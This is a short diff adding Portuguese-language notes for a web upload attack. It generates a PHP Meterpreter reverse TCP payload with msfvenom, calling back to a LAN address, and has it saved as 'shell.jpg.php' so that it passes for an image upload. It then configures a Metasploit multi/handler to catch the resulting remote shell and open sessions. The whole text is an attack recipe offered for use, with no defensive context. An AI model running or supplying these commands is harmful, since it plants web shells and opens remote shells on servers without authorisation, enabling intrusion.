@@ -1,0 +1,13 @@
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=4444 -f raw
+
+salve um arquivo shell.jpg.php com o conteúdo gerado com o comando anterior.
+
+$ msfconsole
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST SEU_IP
+msf exploit(handler) > set LPORT 4444
+msf exploit(handler) > exploit -j -Z
+sessions l
+sessions 1
+meterpreter > comandos_shell
